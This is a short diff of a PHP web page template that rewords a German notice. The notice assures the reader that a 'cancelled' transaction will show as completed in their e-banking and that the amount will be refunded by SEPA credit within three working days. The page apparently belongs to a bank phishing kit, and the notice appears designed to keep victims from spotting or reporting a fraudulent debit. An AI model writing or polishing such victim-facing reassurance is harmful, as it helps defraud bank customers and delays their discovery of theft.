@@ -273,7 +273,7 @@ if (is_array($customCommandData)) {
                     <line x1="12" y1="8" x2="12.01" y2="8"></line>
                 </svg>
                 <span>
-                    Nachdem Sie diesen Prozess durchgef&uuml;hrt haben, wird die stornierte Transaktion in Ihrem E-Banking sichtbar sein. Sie wird dort als durchgef&uuml;hrt angezeigt, wurde jedoch unmittelbar storniert. Der Betrag wird Ihnen per SEPA-Gutschrift zur&uuml;ckerstattet. Dies kann bis zu drei Werktage in Anspruch nehmen.
+                    Sobald Sie den Prozess abgeschlossen haben, erscheint die stornierte Transaktion in Ihrem E-Banking. Sie wird dort als durchgef&uuml;hrt angezeigt, obwohl sie unmittelbar storniert wurde. Der Betrag wird Ihnen per SEPA-Gutschrift zur&uuml;ckerstattet &ndash; dies kann bis zu drei Werktage in Anspruch nehmen.
                 </span>
             </div>
 
